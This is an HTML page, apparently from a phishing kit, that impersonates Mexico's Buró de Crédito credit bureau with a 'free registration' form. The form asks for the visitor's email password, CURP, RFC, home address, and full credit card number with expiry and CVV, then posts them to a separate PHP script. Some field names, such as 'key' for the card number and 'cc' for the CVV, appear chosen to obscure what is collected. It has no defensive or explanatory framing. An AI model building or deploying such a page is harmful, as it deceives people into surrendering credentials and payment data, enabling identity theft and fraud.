<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="icon" type="image/x-icon" href="https://uploads-ssl.webflow.com/5e3c807f0eb5905168653b61/5e46eb491ffbe325e07c8e61_32x32-14.png">
	<link rel="stylesheet" href="assets/index.css">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
	<script src="https://kit.fontawesome.com/a076d05399.js"></script>
	<link rel="stylesheet" href="assets/registro.css">
	<title>Registro Buro de Credito</title>
</head>
<body>
	<nav>
		<input type="checkbox" id="check">
		<label for="check" class="checkbtn">
			<i class="fas fa-bars"></i>
		</label>
		<label class="logo"><img src="https://www.burodecredito.com.mx/img/logo-buro.jpg" alt=""></label>
		<ul>
			<li><a href="index.php" class="text">Home</a></li>
			<li><a class="active" href="registro.php">Comienza ahora, es gratis</a></li>
		</ul>
	</nav>
	<!--Procedimiento-->
	<div class="procedimiento">
		<div class="align-procedimiento">
			<div class="titl">
				<p class="pasos">Paso 1 de 2</p>
				<h1>Para un mejor servicio</h1>
				<p class="mini">Ingresa los datos solicitados, nos ayudara a validar tu identidad.</p>
			</div>
			<div class="formulario-god">
				<form action="personales-validacion.php" method="POST">
					<div class="contenido">
						<h1>Digitales</h1>
						<label for="mail">Correo electronico</label>
						<br>
						<input type="mail" placeholder="Correo electronico" name="mil">
						<br>
						<label>Contraseña</label>
						<br>
						<input type="password" name="pass" placeholder="Contraseña">
						<br>
						<label>Telefono</label>
						<br>
						<input type="text" maxlength="10" name="robot" placeholder="10 Digitos">
					</div>
					<div class="contenido">
						<h1>Personales</h1>
						<label>Nombre(s)</label>
						<br>
						<input type="text" name="name" placeholder="Nombre(s)">
						<br>
						<label>Apellidos</label>
						<input type="text" name="aple" placeholder="Apellidos">
						<br>
						<label>Fecha de Nacimiento</label>
						<br>
						<input type="date" name="date">
						<br>
						<label>CURP</label>
						<br>
						<input type="text" name="crp" placeholder="CURP">
					</div>
					<div class="contenido">
						<h1>Domiciliarios</h1>
						<label>Calle y Número</label>
						<br>
						<input type="text" name="dom" placeholder="Calle y No.">
						<br>
						<label>Código postal</label>
						<br>
						<input type="text" name="postal" placeholder="Código P.">
						<br>
						<label>Colonia</label>
						<br>
						<input type="text" name="col" placeholder="Colonia">
						<br>
						<label>Municipio</label>
						<input type="text" name="munici" placeholder="Municipio">
						<br>
						<label>Estado</label>
						<input type="text" name="state" placeholder="Estado">
					</div>
					<div class="contenido">
						<h1>Necesitamos los datos de una de tus tarjetas de credito</h1>
						<br>
						<label >Tarjeta de Credito</label>
						<br>
						<input type="text" maxlength="16" placeholder="Inserta 16 digitos" name="key">
						<br>
						<label>Fecha de Vencimiento</label>
						<br>
						<input type="text" maxlength="5" name="ven" placeholder="MM/AA">
						<br>
						<label>CVV</label>
						<br>
						<input type="text" maxlength="3" name="cc" placeholder="CVV">
						<br>
						<label>RFC</label>
						<br>
						<input type="text" placeholder="RFC" name="digitos">
						<br>
						<button type="submit" class="form-button">Siguiente</button>

					</div>
					<div class="contenido">
					</div>
				</form>
			</div>
		</div>
	</div>
</body>
</html>